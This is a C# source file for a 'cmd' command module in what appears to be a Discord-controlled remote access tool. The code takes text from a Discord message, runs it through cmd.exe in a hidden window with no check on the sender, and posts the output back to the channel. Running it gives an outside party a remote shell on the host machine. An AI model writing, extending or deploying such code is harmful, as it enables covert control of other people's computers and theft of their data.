using System.Diagnostics;
using Diethynylbenzene.Source.Core;
using Discord.WebSocket;

namespace Diethynylbenzene.Source.Commands
{
	public class Cmd : CommandBase
	{
		public override string Name => "cmd";
		public override string Description => "run commands through cmd";

		public override async Task ExecuteAsync(SocketMessage message, string cmd, string[] args)
		{
			try
			{
				using Process proc = new();
				proc.StartInfo.FileName = "cmd.exe";
				proc.StartInfo.Arguments = "/c " + string.Join(" ", args);
				proc.StartInfo.UseShellExecute = false;
				proc.StartInfo.RedirectStandardOutput = true;
				proc.StartInfo.RedirectStandardError = true;
				proc.StartInfo.CreateNoWindow = true;

				proc.Start();

				string output = await proc.StandardOutput.ReadToEndAsync();
				string error = await proc.StandardError.ReadToEndAsync();

				await proc.WaitForExitAsync();

				string returned = string.IsNullOrEmpty(error) ? output : "error: " + error;

				if (returned.Length > 1900)
				{
					returned = returned[..1900] + "...";
				}

				await message.Channel.SendMessageAsync($"```\n{returned}\n```");
			}
			catch(Exception ex)
			{
				await message.Channel.SendMessageAsync("could not execute: " + ex);
			}
		}
	}
}